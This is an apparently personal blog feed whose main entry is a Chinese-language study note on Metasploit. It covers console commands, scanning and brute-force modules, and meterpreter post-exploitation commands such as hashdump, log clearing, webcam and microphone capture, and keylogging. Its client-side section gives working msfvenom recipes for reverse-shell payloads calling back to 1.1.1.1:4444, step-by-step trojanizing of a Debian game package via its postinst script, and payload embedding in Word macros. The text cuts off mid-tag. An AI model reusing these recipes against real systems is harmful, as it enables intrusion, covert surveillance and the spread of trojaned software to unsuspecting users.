    
    
    
    <entry>
      <title>SQLmap</title>
      <link href="2020/10/29/sqlmap/"/>
      <url>2020/10/29/sqlmap/</url>
      
        <content type="html"><![CDATA[<p>先写上，好逼着自己赶紧抽空把这么学习笔记给完成</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> SQLmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python</title>
      <link href="2020/10/29/python/"/>
      <url>2020/10/29/python/</url>
      
        <content type="html"><![CDATA[<p>先写上，好逼着自己赶紧抽空把这么学习笔记给完成</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>msf</title>
      <link href="2020/10/29/msf/"/>
      <url>2020/10/29/msf/</url>
      
        <content type="html"><![CDATA[<center>msf学习笔记</center><h1 id="先看师傅咋学的"><a href="#先看师傅咋学的" class="headerlink" title="先看师傅咋学的"></a>先看师傅咋学的</h1><p><a href="https://www.ascotbe.com/2020/05/06/MeterpreterCommand/#%E5%89%8D%E8%A8%80" target="_blank" rel="noopener">https://www.ascotbe.com/2020/05/06/MeterpreterCommand/#%E5%89%8D%E8%A8%80</a></p><p><a href="https://www.ascotbe.com/2020/05/06/MeterpreterCommand/#%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E8%A7%A3%E6%9E%90" target="_blank" rel="noopener">https://www.ascotbe.com/2020/05/06/MeterpreterCommand/#%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E8%A7%A3%E6%9E%90</a></p><p><a href="https://img2020.cnblogs.com/blog/2092671/202010/2092671-20201031164610526-1646989081.png" target="_blank" rel="noopener">https://img2020.cnblogs.com/blog/2092671/202010/2092671-20201031164610526-1646989081.png</a>)</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.rapid7.com/" target="_blank" rel="noopener">https://www.rapid7.com/</a></p><p><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework</a></p><p><a href="https://www.anquanke.com/post/id/209966" target="_blank" rel="noopener">https://www.anquanke.com/post/id/209966</a></p><p><a href="https://www.anquanke.com/post/id/209974" target="_blank" rel="noopener">https://www.anquanke.com/post/id/209974</a></p><p><a href="https://tophub.today/search?q=msf" target="_blank" rel="noopener">https://tophub.today/search?q=msf</a></p><p><a href="https://parrotsec-cn.org/t/metasploit/95" target="_blank" rel="noopener">https://parrotsec-cn.org/t/metasploit/95</a></p><p><img src="https://p3.ssl.qhimg.com/t01a66f41cdd2d32845.jpg" alt="img"></p><p>知道漏洞名称之后可以在搜索对应的模块或者pc添加利用</p><pre><code>https://www.exploit-db.comhttps://www.rapid7.com</code></pre><h1 id="msf框架体系结构"><a href="#msf框架体系结构" class="headerlink" title="msf框架体系结构"></a>msf框架体系结构</h1><p><img src="C:%5CUsers%5CRESCUER%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201108135046311.png" alt="image-20201108135046311"></p><p><img src="https://parrotsec-cn.org/uploads/default/original/1X/0ed3dfc02274ea463133d1e76f8c626af5966a6b.png" alt="img"></p><p><img src="C:%5CUsers%5CRESCUER%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201107222344746.png" alt="image-20201107222344746"></p><h2 id="Rex"><a href="#Rex" class="headerlink" title="Rex:"></a>Rex:</h2><ol><li>基本功能库</li><li>处理socket连接访问、协议应答（http/ssl/SMB等）</li></ol><h2 id="Msf-Core"><a href="#Msf-Core" class="headerlink" title="Msf::Core"></a>Msf::Core</h2><ol><li>提供核心基本API，是框架的核心能力实现库</li></ol><h2 id="Msf-Base"><a href="#Msf-Base" class="headerlink" title="Msf::Base"></a>Msf::Base</h2><ol><li>提供API接口，便于调用模块的库</li></ol><h2 id="Plugin插件"><a href="#Plugin插件" class="headerlink" title="Plugin插件"></a>Plugin插件</h2><h1 id="help命令"><a href="#help命令" class="headerlink" title="help命令"></a>help命令</h1><h2 id="Core-Commands"><a href="#Core-Commands" class="headerlink" title="Core Commands"></a>Core Commands</h2><pre><code>Command       Description-------       -----------?             Help menubanner        Display an awesome metasploit bannercd            Change the current working directorycolor         Toggle colorconnect       Communicate with a hostdebug         Display information useful for debuggingexit          Exit the consoleget           Gets the value of a context-specific variablegetg          Gets the value of a global variablegrep          Grep the output of another commandhelp          Help menuhistory       Show command historyload          Load a framework pluginquit          Exit the consolerepeat        Repeat a list of commandsroute         Route traffic through a sessionsave          Saves the active datastoressessions      Dump session listings and display information about sessionsset           Sets a context-specific variable to a valuesetg          Sets a global variable to a valuesleep         Do nothing for the specified number of secondsspool         Write console output into a file as well the screenthreads       View and manipulate background threadstips          Show a list of useful productivity tipsunload        Unload a framework pluginunset         Unsets one or more context-specific variablesunsetg        Unsets one or more global variablesversion       Show the framework and console library version numbers</code></pre><h2 id="Module-Commands"><a href="#Module-Commands" class="headerlink" title="Module Commands"></a>Module Commands</h2><pre><code>Command       Description-------       -----------advanced      Displays advanced options for one or more modulesback          Move back from the current contextclearm        Clear the module stackinfo          Displays information about one or more moduleslistm         List the module stackloadpath      Searches for and loads modules from a pathoptions       Displays global options or for one or more modulespopm          Pops the latest module off the stack and makes it activeprevious      Sets the previously loaded module as the current modulepushm         Pushes the active or list of modules onto the module stackreload_all    Reloads all modules from all defined module pathssearch        Searches module names and descriptionsshow          Displays modules of a given type, or all modulesuse           Interact with a module by name or search term/index</code></pre><h2 id="Job-Commands"><a href="#Job-Commands" class="headerlink" title="Job Commands"></a>Job Commands</h2><pre><code>Command       Description-------       -----------handler       Start a payload handler as jobjobs          Displays and manages jobskill          Kill a jobrename_job    Rename a job</code></pre><h2 id="Resource-Script-Commands"><a href="#Resource-Script-Commands" class="headerlink" title="Resource Script Commands"></a>Resource Script Commands</h2><pre><code>Command       Description-------       -----------makerc        Save commands entered since start to a fileresource      Run the commands stored in a file</code></pre><h2 id="Database-Backend-Commands"><a href="#Database-Backend-Commands" class="headerlink" title="Database Backend Commands"></a>Database Backend Commands</h2><pre><code>Command           Description-------           -----------analyze           Analyze database information about a specific address or address rangedb_connect        Connect to an existing data servicedb_disconnect     Disconnect from the current data servicedb_export         Export a file containing the contents of the databasedb_import         Import a scan result file (filetype will be auto-detected)db_nmap           Executes nmap and records the output automaticallydb_rebuild_cache  Rebuilds the database-stored module cache (deprecated)db_remove         Remove the saved data service entrydb_save           Save the current data service connection as the default to reconnect on startupdb_status         Show the current data service statushosts             List all hosts in the databaseloot              List all loot in the databasenotes             List all notes in the databaseservices          List all services in the databasevulns             List all vulnerabilities in the databaseworkspace         Switch between database workspaces</code></pre><h2 id="Credentials-Backend-Commands"><a href="#Credentials-Backend-Commands" class="headerlink" title="Credentials Backend Commands"></a>Credentials Backend Commands</h2><pre><code>Command       Description-------       -----------creds         List all credentials in the database</code></pre><h2 id="Developer-Commands"><a href="#Developer-Commands" class="headerlink" title="Developer Commands"></a>Developer Commands</h2><pre><code>Command       Description-------       -----------edit          Edit the current module or a file with the preferred editorirb           Open an interactive Ruby shell in the current contextlog           Display framework.log paged to the end if possiblepry           Open the Pry debugger on the current module or Frameworkreload_lib    Reload Ruby library files from specified paths</code></pre><h2 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h2><p><code>msfconsole</code> is the primary interface to Metasploit Framework. There is quite a<br>lot that needs go here, please be patient and keep an eye on this space!</p><h2 id="Building-ranges-and-lists"><a href="#Building-ranges-and-lists" class="headerlink" title="Building ranges and lists"></a>Building ranges and lists</h2><p>Many commands and options that take a list of things can use ranges to avoid<br>having to manually list each desired thing. All ranges are inclusive.</p><h3 id="Ranges-of-IDs"><a href="#Ranges-of-IDs" class="headerlink" title="Ranges of IDs"></a>Ranges of IDs</h3><p>Commands that take a list of IDs can use ranges to help. Individual IDs must be<br>separated by a <code>,</code> (no space allowed) and ranges can be expressed with either<br><code>-</code> or <code>..</code>.</p><h3 id="Ranges-of-IPs"><a href="#Ranges-of-IPs" class="headerlink" title="Ranges of IPs"></a>Ranges of IPs</h3><p>There are several ways to specify ranges of IP addresses that can be mixed<br>together. The first way is a list of IPs separated by just a <code></code> (ASCII space),<br>with an optional <code>,</code>. The next way is two complete IP addresses in the form of<br><code>BEGINNING_ADDRESS-END_ADDRESS</code> like <code>127.0.1.44-127.0.2.33</code>. CIDR<br>specifications may also be used, however the whole address must be given to<br>Metasploit like <code>127.0.0.0/8</code> and not <code>127/8</code>, contrary to the RFC.<br>Additionally, a netmask can be used in conjunction with a domain name to<br>dynamically resolve which block to target. All these methods work for both IPv4<br>and IPv6 addresses. IPv4 addresses can also be specified with special octet<br>ranges from the <a href="https://nmap.org/book/man-target-specification.html" target="_blank" rel="noopener">NMAP target<br>specification</a></p><h3 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h3><p>Terminate the first sessions:</p><pre><code>sessions -k 1</code></pre><p>Stop some extra running jobs:</p><pre><code>jobs -k 2-6,7,8,11..15</code></pre><p>Check a set of IP addresses:</p><pre><code>check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255</code></pre><p>Target a set of IPv6 hosts:</p><pre><code>set RHOSTS fe80::3990:0000/110, ::1-::f0f0</code></pre><p>Target a block from a resolved domain name:</p><pre><code>set RHOSTS www.example.test/24</code></pre><h1 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h1><ol><li>msfvenom -l payloads 查看所有可用payload列表</li><li>msfvenom -l encoders 产看可用编辑器</li><li>-p:<ol><li>指定要使用的payload</li><li>使用自定义payload</li></ol></li><li>-f：指定输出格式</li></ol><h1 id="metasploitrpc-服务"><a href="#metasploitrpc-服务" class="headerlink" title="metasploitrpc 服务"></a>metasploitrpc 服务</h1><h1 id="metasploit免杀"><a href="#metasploit免杀" class="headerlink" title="metasploit免杀"></a>metasploit免杀</h1><h1 id="默认模块路径"><a href="#默认模块路径" class="headerlink" title="默认模块路径"></a>默认模块路径</h1><blockquote><p>/usr/share/metasploit-framework/modules</p></blockquote><h1 id="Aux（辅助模块）"><a href="#Aux（辅助模块）" class="headerlink" title="Aux（辅助模块）"></a>Aux（辅助模块）</h1><blockquote><p>执行信息收集、美句、职位探测、扫描等功能的辅助模块（没有payload的expoit模块）</p></blockquote><h1 id="Nops（空指令模块）"><a href="#Nops（空指令模块）" class="headerlink" title="Nops（空指令模块）"></a>Nops（空指令模块）</h1><blockquote><p>提高payload稳定性及维持大小</p></blockquote><h1 id="Encoders（编码器模块）"><a href="#Encoders（编码器模块）" class="headerlink" title="Encoders（编码器模块）"></a>Encoders（编码器模块）</h1><blockquote><p>对payload进行加密，躲避AV检查的模块</p></blockquote><h1 id="msf控制台命令"><a href="#msf控制台命令" class="headerlink" title="msf控制台命令"></a>msf控制台命令</h1><ol><li>postgre数据库（5432）</li><li>Banner 显示一个很棒的metasploit横幅</li><li>Color 切换颜色</li><li>connect -h</li><li>show auxiliary / exploits / payloads / encoders / nops</li><li>search usermap_script / help search<ol><li>search name:mysql / path:scada / platform:aix / type:aux /author:aaron /<br>cve:2011 / 可多条件同时搜索</li></ol></li><li>use dos/windows/smb/ms09_001_write<ol><li>show options / payloads / targets / advanced / evasion</li><li>info edit</li></ol></li><li>Check 、back</li><li>db_status / db_rebuild_cache</li><li>db_nmap<ol><li>Hosts / host 1.1.1.1 / hosts -u / hosts -c address,os_flavor -S Linux</li><li>services -p 80 / services -c info,name -p 1-1000</li><li>vulns / creds (mysql_login) / loot (hashdump)</li></ol></li><li>db_disconnect / db_connect<ol><li>/usr/share/metasploit-framework/config/database.yml<br>▪ db_import / db_export<br>– db_import /root/nmap.xml<br>– db_export -f xml /root/bak.xml</li></ol></li><li>set / unset / setg / unsetg / save</li><li>Run / exploit</li><li>jobs / kill 0 </li><li>load / unload /loadpath</li><li>Sessions<ol><li>sessions -l / -i (Shell ̵Meterpreter session̵VNC)</li></ol></li><li>route 通过制定session路由流量</li><li>irb  (Framework::Version)</li><li>Resource  (msfconsol -r a.rc)</li></ol><h1 id="scanner模块"><a href="#scanner模块" class="headerlink" title="scanner模块"></a>scanner模块</h1><h1 id="exploit模块（攻击模块）"><a href="#exploit模块（攻击模块）" class="headerlink" title="exploit模块（攻击模块）"></a>exploit模块（攻击模块）</h1><blockquote><p>对应每一个具体漏洞的攻击方法（主动、被动）</p></blockquote><ol><li>Active exploit<ol><li>use exploit/windows/smb/psexec</li><li>set RHOST 192.168.1.100</li><li>set PAYLOAD windows/shell/reverse_tcp</li><li>set LHOST 192.168.1.1</li><li>set LPORT 4444</li><li>set SMBUSER user1</li><li>set SMBPASS pass1</li><li>exploit</li></ol></li><li>Passive Exploits<ol><li>use exploit/windows/browser/ms07_017_ani_loadimage_chunksize</li><li>set URIPATH /</li><li>set PAYLOAD windows/shell/reverse_tcp</li><li>set LHOST 192.168.1.1</li><li>set LPORT 4444 </li><li>exploit</li></ol></li></ol><h1 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h1><blockquote><p>生成payload，有有两个必须的选项：-p -f。使用-p 来指定要使用的payload</p></blockquote><ol><li>use payload/windows/shell_bind_tcp</li><li>generate（ 坏字符）<ol><li>msf自动选择编码模块绕过坏字符<ol><li>generate -b ‘\x00’</li><li>generate -b ‘\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b’</li><li>generate -b ‘\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b<br>\xFF\x0a\x0b\x01\xcc\6e\x1e\x2e\x26’ </li></ol></li><li>手动指定编码模块<ol><li>show encoders / generate -e x86/nonalpha</li></ol></li><li>generate -b ‘\x00’ -t exe -e x86/shikata_ga_nai -i 5 -k -x /usr/<br>share/windows-binaries/radmin.exe -f /root/1.exe</li><li>NOPғno-operation / Next Operation（无任何操作）<ol><li>EIP返回到存储NOP sled的任意地址时将递增，最终导致shellcode执行</li><li>generate -s 14</li></ol></li></ol></li></ol><h1 id="msf-pingback-payloads"><a href="#msf-pingback-payloads" class="headerlink" title="msf pingback payloads"></a>msf pingback payloads</h1><p><a href="https://xz.aliyun.com/t/6268" target="_blank" rel="noopener">https://xz.aliyun.com/t/6268</a></p><h1 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h1><ol><li>高级、动态、可拓展的payload<ol><li>基于meterpreter上下文利用更多漏洞发起攻击</li><li>后渗透测试阶段一站式操作界面</li></ol></li><li>完全基于内存的DLL注入式payload（不写硬盘）<ol><li>注入合法系统进程并建立stager</li><li>基于stager上传和预加载DLL进行拓展模块的注入（客户端API）</li><li>依据stager建立的socket连接建立加密的TLS/1.0通信隧道</li><li>利用TLS隧道进一步加载后续拓展模块（避免网络取证）</li></ol></li></ol><h2 id="meterpreter基本命令"><a href="#meterpreter基本命令" class="headerlink" title="meterpreter基本命令"></a>meterpreter基本命令</h2><ol><li><p>Help、background(将当前会话放置后台)</p></li><li><p>Run、bgrun</p></li><li><p>Cd 、ls 、cat 、pwd 、dir 、mkdir 、mv 、rm 、rmdir 、edit</p></li><li><p>lpwd（local 查看本地当前的工作目录） 、lcd </p></li><li><p>clearev（清除windows中的应用程序日志、系统日志、安全日志，需要管理员权限） 、download</p><blockquote><p>upload /usr/share/windows-binaries/nc.exe c:\windows\system32</p></blockquote></li><li><p>execute -f cmd.exe -i –H</p></li><li><p>getuid(查看权限 ) 、getsystem 、getprivs 、getproxy 、getpid(获取当前进程的pid)</p></li><li><p>Hashdump 、run post/windows/gather/hashdump</p></li><li><p>sysinfo （查看目标机系统信息）、ps(查看当前活跃进程) 、kill(杀死进程) 、migrate（将Meterpreter迁移到我们想注入的进程里面） 、reboot 、shutdown 、shell(进入目标机cmd shell)</p></li><li><p>show_mount 、search -f autoexec.bat </p></li><li><p>arp /arp -a（查看高速缓存中的所有项目）、netstat/netstat -na（显示所有连接的端口） 、ipconfig 、ifconfig 、route（路由信息）</p><blockquote><p>很重要，因为攻击机处于外网，目标主机处于内网，他们之间是不能通信的，故需要添加路由来把攻击机的IP添加到内网里面，这样我们就可以横扫内网，就是所谓的<code>内网代理</code></p></blockquote></li><li><p>Idletime(查看目标机闲置时间) 、resource</p></li><li><p>record_mic 、webcam_stream（通过摄像头开启视频）、webcam_list(查看摄像头) 、webcam_snap(通过摄像头拍照) -i 1 -v false</p></li></ol><h2 id="msf信息搜集"><a href="#msf信息搜集" class="headerlink" title="msf信息搜集"></a>msf信息搜集</h2><blockquote><p>一般情况下我们在渗透测试的时候，如果在不知道资产的情况下，我们会把整个网端进行扫描存活主机，然后再对存活的信息收集信息，这样的话就可以缩短我们的渗透测试时间，而不盲目的去测试</p><p>不管是端口扫描还是探测存活主机，都是要设置目标IP地址set rhosts ip地址，如果扫描整个网段的话，最后设置一下线程：set thread 线程数(根据情况设置)。</p><p>22、445、3389等敏感端口开放情况探测，在这里需要说明一下，以小白的渗透测试经验，一般先不扫描整个网端，因为这样对目标主机有损耗，可以直接扫描有溢出漏洞的高危端口，如果有的话，那么就可以通过溢出进行提权，这样的方法也是一种捷径。相反的情况下，如果全端口扫描的话个人建议用nmap工具。</p><p><a href="https://www.freebuf.com/news/210292.html" target="_blank" rel="noopener">https://www.freebuf.com/news/210292.html</a></p></blockquote><blockquote><p>内置密码表地址：/usr/share/wordlists/metasploit/</p></blockquote><p>懒得截图了，太慢了，忘了就去看虚拟机保存的操作吧</p><ol><li><p>Nmap扫描</p><p>db_nmap -sV 192.168.1.0/24</p><p>nmap -sn -RP 192.168.1.1/24</p><blockquote><p>-sn 不扫描端口，只扫描主机</p><p>-PR  ARP ping扫描</p><p>-sP     Ping扫描 sn</p><p>-P0     无Ping扫描</p><p>-PS     TCP SYN Ping扫描</p><p>-PA     TCP ACK Ping扫描</p><p>-PU     UDP ping扫描</p><p>-PE/PM/PP   ICMP Ping Types扫描</p></blockquote></li><li><p>Auxiliary 模块扫描<br>– RHOSTS &lt;&gt; RHOST </p><ol><li>192.168.1.20-192.168.1.30̵192.168.1.0/24,192.168.11.0/24</li><li>file:/root/h.txt</li></ol></li><li><p>search arp </p><blockquote><p>ARP： ARP,通过解析<code>网路层地址</code>来找寻<code>数据链路层地址</code>的一个在网络协议包中极其重要的网络传输 协议。根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的 ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址</p></blockquote><ol><li><p>use auxiliary/scanner/discovery/arp_sweep</p></li><li><p>set INTERFACE 、RHOSTS、SHOST、SMAC、THREADS;run</p><p><img src="C:%5CUsers%5CRESCUER%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201108110525987.png" alt="image-20201108110525987"></p></li></ol></li><li><p>search portscan<br>▪ use auxiliary/scanner/portscan/syn<br>▪ set INTERFACE̵ PORTS̵RHOSTS̵THREADS;run</p></li><li><p>Nmap IPID Idle扫描</p><ol><li>查找ipidseq主机<ol><li>use auxiliary/scanner/ip/ipidseq</li><li>set RHOSTS 192.168.1.0/24 ; run</li></ol></li><li>nmap -PN -sI 1.1.1.2 1.1.1.3</li></ol></li><li><p>UDP扫描</p><blockquote><p>UDP（User Datagram Protocol）是一种<code>无连接</code>的协议，在<code>第四层-传输层</code>，处于IP协议的 上一层。UDP有<code>不提供数据包分组</code>、<code>组装</code>和<code>不能对数据包进行排序</code>的缺点，也就是说，当报 文发送之后，是无法得知其是否安全完整到达的。</p><p>UDP显著特性： </p><ol><li>UDP 缺乏可靠性。UDP 本身不提供确认，超时重传等机制。UDP 数据报可能在网络中被 复制，被重新排序，也不保证每个数据报只到达一次。 </li><li>UDP 数据报是有长度的。每个 UDP 数据报都有长度，如果一个数据报正确地到达目的 地，那么该数据报的长度将随数据一起传递给接收方。而 TCP 是一个字节流协议，没有任 何（协议上的）记录边界。 </li><li>UDP 是无连接的。UDP 客户和服务器之前不必存在长期的关系。大多数的UDP实现中都 选择忽略源站抑制差错，在网络拥塞时，目的端无法接收到大量的UDP数据报 </li><li>UDP 支持多播和广播</li></ol></blockquote><ol><li>use auxiliary（辅助）/scanner（扫描）/discovery（发现）/udp_sweep(彻底搜索)</li><li>use auxiliary/scanner/discovery/udp_probe（探测）</li></ol></li><li><p>密码嗅探</p><ol><li><p>use auxiliary/sniffer/psnuffle</p><blockquote><p> 支持从pcap抓包文件中提取密码</p><p>功能类似于dsniff</p><p>目前只支持pop3、imap、ftp、HTTP GET协议</p></blockquote></li><li><p>SNMP扫描</p><blockquote><p>SNMP是一种简单网络管理协议，它属于TCP/IP五层协议中的<code>应用层协议</code>，用于网络管理的 协议。SNMP主要用于网络设备的管理。SNMP协议主要由两大部分构成：<code>SNMP管理站</code>和 <code>SNMP代理</code>。SNMP管理站是一个中心节点，负责收集维护各个SNMP元素的信息，并对这 些信息进行处理，最后反馈给网络管理员；</p><p>而SNMP代理是运行在各个被管理的网络节点之 上，负责统计该节点的各项信息，并且负责与SNMP管理站交互，接收并执行管理站的命 令，上传各种本地的网络信息。</p></blockquote><p>– vi /etc/default/snmpd 侦听地址修改为 0.0.0.0<br>– use auxiliary/scanner/snmp/snmp_login<br>– <strong>use auxiliary/scanner/snmp/snmp_enum</strong></p><img src="C:\Users\RESCUER\AppData\Roaming\Typora\typora-user-images\image-20201108133419250.png" alt="image-20201108133419250" style="zoom:50%;" /><p>– use auxiliary/scanner/snmp/snmp_enumusers （windows）<br>– use auxiliary/scanner/snmp/snmp_enumshares （windows）</p></li><li><p>SMB版本扫描</p><blockquote><p> SMB(全称是Server Message Block)是一个协议名，它能被用于<code>Web连接</code>和<code>客户端与服务器</code>之间的信息沟通。SMB最初是IBM的贝瑞·费根鲍姆（Barry Feigenbaum）研制的，其<code>目的</code>是将DOS操作系统中的本地文件接口<code>“中断13”</code>改造为<code>网络文件系统</code>。</p></blockquote><pre><code>use auxiliary/scanner/smb/smb_version</code></pre></li><li><p>扫描命名管道，判断SMB服无类型（账号、密码）</p><pre><code>use auxiliary/scanner/smb/pipe_auditor</code></pre></li><li><p>扫描通过SMB管道可以访问的RCERPC服务</p><pre><code>use auxiliary/scanner/smb/pipe_dcerpc_auditor</code></pre></li><li><p>SMB共享枚举（账号、密码）</p><pre><code> use auxiliary/scanner/smb/smb_enumshares</code></pre></li><li><p>SMB用户美句（账号、密码）</p><pre><code> use auxiliary/scanner/smb/smb_enumusers</code></pre></li><li><p>SID枚举（账号、密码）</p><pre><code>use auxiliary/scanner/smb/smb_lookupsid</code></pre></li><li><p>SSH 版本扫描</p><pre><code>use auxiliary/scanner/ssh/ssh_version</code></pre></li><li><p>SSH密码爆破</p><pre><code>use auxiliary/scanner/ssh/ssh_login</code></pre><pre><code>set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt ;set VERBOSE false ;run</code></pre></li><li><p>SSH公钥登录</p><pre><code>use auxiliary/scanner/ssh/ssh_login_pubkey</code></pre><pre><code>set KEY_FILE id_rsa ; set USERNAME root ;run）</code></pre></li></ol></li><li><p>Windows缺少的补丁</p><blockquote><p>基于已经取得的session进行检测</p></blockquote><pre><code>use post/windows/gather/enum_patches #查看目标主机的补丁信息</code></pre><pre><code>show advanced</code></pre><pre><code>set VERBOSE yes</code></pre><blockquote><p> 检查失败</p></blockquote><ol><li>Known bug in WMI query, try migrating to another process</li><li>迁移到另一个进程再次尝试</li></ol></li><li><p>MSSQL扫描端口</p><ol><li><p>TCP 1433（动态端口）/UDP 1434（查询TCP端口号）</p><pre><code>use auxiliary/scanner/mssql/mssql_ping</code></pre></li></ol></li><li><p>爆破MSSQL密码</p><pre><code>use auxiliary/scanner/mssql/mssql_ping</code></pre></li><li><p>远程执行代码</p><pre><code>use auxiliary/admin/mssql/mssql_exec</code></pre><pre><code>set CMD net user user pass /ADD</code></pre></li><li><p>FTP 版本扫描</p><pre><code>use auxiliary/scanner/ftp/ftp_version</code></pre><pre><code>use auxiliary/scanner/ftp/anonymous</code></pre><pre><code>use auxiliary/scanner/ftp/ftp_login</code></pre></li><li><p>use auxiliary/scanner/ [tab]</p><ol><li>Display all 479 possibilities? (y or n)</li></ol></li></ol><h1 id="msf——弱点扫描"><a href="#msf——弱点扫描" class="headerlink" title="msf——弱点扫描"></a>msf——弱点扫描</h1><blockquote><p>根据信息收集结果搜索漏洞利用模块</p></blockquote><ol><li><p>VNC 密码破解</p><pre><code>use auxiliary/scanner/vnc/vnc_login</code></pre></li><li><p>VNC 无密码访问</p><pre><code>use auxiliary/scanner/vnc/vnc_none_auth</code></pre><pre><code>supported : None, free access! </code></pre></li><li><p>RDP 远程桌面漏洞</p><ol><li>use auxiliary/scanner/rdp/ms12_020_check</li><li>检查不会造成DoS攻击</li></ol></li><li><p>设备后门</p><ol><li>use auxiliary/scanner/ssh/juniper_backdoor</li><li>use auxiliary/scanner/ssh/fortinet_backdoor</li></ol></li><li><p>VMWare ESXi密码爆破</p><ol><li>use auxiliary/scanner/vmware/vmauthd_login</li><li>use auxiliary/scanner/vmware/vmware_enum_vms</li></ol></li><li><p>利用WEB API远程开启虚拟机</p><ol><li>use auxiliary/admin/vmware/poweron_vm</li></ol></li><li><p>HTTP 弱点扫描</p><ol><li>过期证书：use auxiliary/scanner/http/cert</li><li>显示目录及文件<ol><li>use auxiliary/scanner/http/dir_listing</li><li>use auxiliary/scanner/http/files_dir </li></ol></li><li>WebDAV Unicode 编码身份验证绕过<ol><li>use auxiliary/scanner/http/dir_webdav_unicode_bypass</li><li>Tomcat 管理登录页面<ol><li>use auxiliary/scanner/http/tomcat_mgr_login</li></ol></li><li>基于HTTP方法的身份验证绕过<ol><li>use auxiliary/scanner/http/verb_auth_bypass</li></ol></li><li>Wordpress 密码爆破<ol><li>use auxiliary/scanner/http/wordpress_login_enum</li><li>set URI /wordpress/wp-login.php</li></ol></li><li>WMAP WEB应用扫描器<ol><li>根据SQLmap的工作方式开发<ol><li>load wmap</li><li>wmap_sites -a <a href="http://1.1.1.1" target="_blank" rel="noopener">http://1.1.1.1</a></li><li>wmap_targets -t <a href="http://1.1.1.1/mutillidae/index.php" target="_blank" rel="noopener">http://1.1.1.1/mutillidae/index.php</a></li><li>wmap_run -t </li><li>wmap_run -e</li><li>wmap_vulns -l </li><li>vulns</li></ol></li></ol></li></ol></li></ol></li><li><p>Openvas</p><ol><li>Load openvas</li><li>db_import openvas.nbe </li><li>Nessus</li><li>Nexpose<ol><li>Xml格式日志文件</li></ol></li></ol></li><li><p>MSF 直接调用Nessus执行扫描</p><ol><li>Load nessus</li><li>nessus_help </li><li>nessus_connect admin:<a href="mailto:toor@1.1.1.1">toor@1.1.1.1</a></li><li>nessus_policy_list</li><li>nessus_scan_new </li><li>nessus_report_list</li></ol></li></ol><h1 id="msf客户端渗透"><a href="#msf客户端渗透" class="headerlink" title="msf客户端渗透"></a>msf客户端渗透</h1><ol><li>诱骗被害者执行payload（windows）<ol><li>msfvenom –payload-options -p windows/shell/reverse_tcp </li><li>msfvenom -a x86 –platform windows -p windows/shell/reverse_tcp<br>LHOST=1.1.1.1 LPORT=4444 -b “\x00” -e x86/shikata_ga_nai -f exe -o<br>1.exe</li><li>msfconsole<ol><li>use exploit/multi/handler</li><li>set payload windows/shell/reverse_tcp</li><li>set LHOST 1.1.1.1</li><li>set LPORT 4444</li><li>exploit</li></ol></li></ol></li><li>诱骗被害者执行payload（Linux deb安装包）<ol><li>apt-get –download-only install freesweep</li><li>dpkg -x freesweep_0.90-1_i386.deb free</li><li>mkdir free/DEBIAN &amp;&amp; cd free/DEBIAN</li><li>vi control</li><li>vi postinst<ol><li>#!/bin/sh </li><li>sudo chmod 2755 /usr/games/freesweep_scores &amp;&amp; /usr/games/<br>freesweep_scores &amp; /usr/games/freesweep &amp;</li></ol></li><li>msfvenom -a x86 –platform linux -p linux/x86/shell/reverse_tcp<br>LHOST=1.1.1.1 LPORT=4444 -b “\x00” -f elf -o /root/free/usr/games/<br>freesweep_scores</li><li>chmod 755 postinst</li><li>dpkg-deb –build /root/free</li></ol></li><li>利用Acrobat Reader漏洞执行payload<ol><li>构造PDF文件exploit/：windows/fileformat/adobe_utilprintf</li><li>构造恶意网站：exploit/windows/browser/adobe_utilprintf</li><li>Meterpreter<ol><li>use priv</li><li>run post/windows/capture/keylog_recorder </li></ol></li><li>利用Flash插件漏洞执行payload<ol><li>– use exploit/multi/browser/adobe_flash_hacking_team_uaf</li><li>use exploit/multi/browser/adobe_flash_opaque_background_uaf</li><li>use auxiliary/server/browser_autopwn2</li></ol></li><li>利用IE浏览器漏洞执行payload<ol><li>– use exploit/windows/browser/ms14_064_ole_code_execution</li></ol></li></ol></li><li>利用 JRE 漏洞执行payload<ol><li>use exploit/multi/browser/java_jre17_driver_manager</li><li>use exploit/multi/browser/java_jre17_jmxbean</li><li>use exploit/multi/browser/java_jre17_reflection_types</li></ol></li><li>生成Android后门程序<ol><li>use payload/android/meterpreter/reverse_tcp</li><li>generate -f a.apk -p android -t raw</li></ol></li><li>VBScript 感染方式<ol><li>利用宏感染word、excel文档</li><li>绕过某些基于文件类型检查的安全机制</li><li>生成vbscript脚本：msfvenom -a x86 –platform windows -p windows/<br>meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -e x86/shikata_ga_nai<br>-f vba-exe</li><li>Office 2007 +<ol><li>视图——宏——创建</li><li>Payload 第一部分VBA代码<br>Payload 第二部分粘入word文档正文：</li><li>Msf 启动侦听<ol><li>use exploit/multi/handler</li><li>set payload windows/meterpreter/reverse_tcp</li></ol></li></ol></li></ol></li></ol><h1 id="msf后渗透测试"><a href="#msf后渗透测试" class="headerlink" 